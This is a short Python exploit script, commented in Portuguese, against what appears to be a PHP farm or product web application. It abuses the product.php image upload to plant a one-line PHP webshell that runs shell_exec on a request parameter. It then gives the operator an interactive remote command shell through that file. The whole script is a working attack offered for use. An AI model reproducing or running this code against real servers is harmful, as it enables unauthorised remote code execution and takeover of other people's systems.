import requests
from colorama import Fore, Style, init
import urllib3

# Desativa warnings de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inicializa o colorama
init(autoreset=True)

def upload_backdoor(target, path):
    upload_url = f"{target}{path}/product.php"
    shell_url = f"{target}{path}/assets/img/productimages/web-backdoor.php"

    # Payload PHP da webshell
    data = "<?php echo shell_exec($_REQUEST['cmd']); ?>"

    payload = {
        'category': 'CHICKEN',
        'product': 'rce',
        'price': '100',
        'save': ''
    }

    files = {
        'productimage': ('web-backdoor.php', data, 'application/x-php')
    }

    try:
        print(Fore.YELLOW + "[*] Enviando webshell para:", upload_url)
        response = requests.post(upload_url, files=files, data=payload, verify=False)

        if response.status_code == 200:
            print(Fore.GREEN + "[+] Webshell enviada com sucesso!")
            print(Fore.GREEN + f"[+] Shell URL: {shell_url}")
            return shell_url
        else:
            print(Fore.RED + f"[-] Falha ao enviar webshell! Status code: {response.status_code}")
            return None
    except requests.RequestException as e:
        print(Fore.RED + f"[-] Erro durante o envio: {e}")
        return None

def interactive_shell(shell_url):
    print(Fore.CYAN + "\n[!] Conectado à shell remota. Digite seus comandos abaixo.")
    print(Fore.CYAN + "[!] Digite 'exit' para sair.\n")

    while True:
        cmd = input(Fore.LIGHTGREEN_EX + "shell$ ").strip()
        if cmd.lower() in ["exit", "quit"]:
            print(Fore.YELLOW + "[*] Fechando conexão...")
            break

        try:
            params = {'cmd': cmd}
            response = requests.get(shell_url, params=params, verify=False, timeout=10)
            output = response.text.strip()
            if output:
                print(Fore.WHITE + output)
            else:
                print(Fore.RED + "[!] Nenhuma saída retornada.")
        except requests.RequestException as e:
            print(Fore.RED + f"[-] Erro durante execução do comando: {e}")

if __name__ == "__main__":
    target = input(Fore.CYAN + "Alvo (ex: http://10.10.10.10): ").strip().rstrip("/")
    path = input(Fore.CYAN + "Diretório do sistema (ex: /farm): ").strip().rstrip("/")

    shell = upload_backdoor(target, path)

    if shell:
        interactive_shell(shell)
    else:
        print(Fore.RED + "[-] Falha no envio da shell.")
